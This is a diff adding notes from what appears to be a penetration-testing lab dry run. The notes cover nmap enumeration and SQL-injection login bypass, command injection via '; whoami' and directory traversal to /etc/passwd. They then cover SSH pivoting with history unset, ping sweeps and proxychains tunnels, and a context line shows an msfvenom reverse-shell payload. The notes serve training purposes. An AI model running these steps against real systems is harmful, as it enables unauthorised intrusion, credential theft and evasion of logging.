@@ -211,3 +211,152 @@ msfvenom -p windows/shell/reverse_tcp lhost=10.50.37.42 lport=54321 -b "\x00" -f
 lhost is LINOPS FLOAT IP
 LPORT is RHP used in MSFCONSOLE
 ```
+
+
+
+
+
+# Dry Run Review
+
+## 1 Host Enumeration (TGT1)
+First NMAP the given IP Address to get information about the ports open
+```
+student@lin-ops:~$ nmap -Pn -T4 10.50.36.82
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-28 17:46 UTC
+Nmap scan report for 10.50.36.82
+Host is up (0.0023s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 3.93 seconds
+```
+
+
+
+## 2 Port Enumeration (TGT1)
+Perform a http-enum script to see what the port 80 has
+```
+student@lin-ops:~$ nmap --script http-enum 10.50.36.82
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-28 17:48 UTC
+Nmap scan report for 10.50.36.82
+Host is up (0.0044s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+| http-enum: 
+|   /login.php: Possible admin folder
+|   /login.html: Possible admin folder
+|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+Nmap done: 1 IP address (1 host up) scanned in 5.30 seconds
+```
+
+## 3 Website Enumeration (TGT1)
+Firefox to the IP Address hosting port 80 and enumerate
+http://10.50.36.82
+
+Open all the tabs to see what each site can be used for information
+
+
+## 4 Authentication Bypass Login.html (TGT1)
+```
+login.html
+
+Perform truth statement in both fields 
+
+username: ' or 1 = '1
+password: ' or 1 = '1
+
+If we get information we Inspect and go to Network --> Post --> Copy to URL/?<paste>
+http://10.50.36.82/login.php/?<PASTE NETWORK POST RAW INFORMATION>
+```
+
+## 5 Search File to Read (TGT1)
+```
+test ; whoami to see if it would get information
+
+perform a directory traversel
+../../../../../etc/passwd
+
+Copy the USERS with shells and get the users with credentials we found from Authentication Bypass
+
+
+Get Careers Page: ---> Directory Traversal
+../../../../etc/passwd
+user2:.....
+
+../../../../../etc/host
+for information about hosts for next pivot
+
+```
+
+## 6 Malicious Upload (TGT1)
+```
+Need to know:
+Way to Upload
+Where it Uploads
+Way to run it
+
+Upload Pages
+upload.php
+
+How to:
+
+
+```
+
+## 7 /scripts (TGT1)
+```
+http-enum provided sub directories and within /scripts we located information about a user
+
+```
+
+
+## 8 Authenticate TGT1 and Enum next PIVOT (TGT1)
+```
+ssh user2@10.50.36.28
+
+> bash
+> unset histfile
+> for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done (ping sweep command to locate other boxes)
+
+user2@PublicFacingWebsite:/$ for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=1.23 ms
+64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=8.98 ms
+64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.068 ms
+
+ssh -MS /tmp/T1 user2@10.50.36.28
+ssh -S /tmp/T1 T1 -O forward -D 9050 (Dynamic SOCKET)
+
+> proxychains nmap 192.168.28.181
+> proxychains nc 192.168.28.181 <PORT> (This will enumerate each port to verify the service)
+> proxychains nmap --script http-enum 192.168.28.181
+
+
+
+```
+
+
+## 9 Tunnel to TGT2 80 (TGT2)
+```
+ssh -S /tmp/T1 T1 -O forward -L 1234:192.168.28.181:80
+firefox
+http://127.0.0.1:1234
+
+
+```
+
+
+
+
+
+
+
+
+```
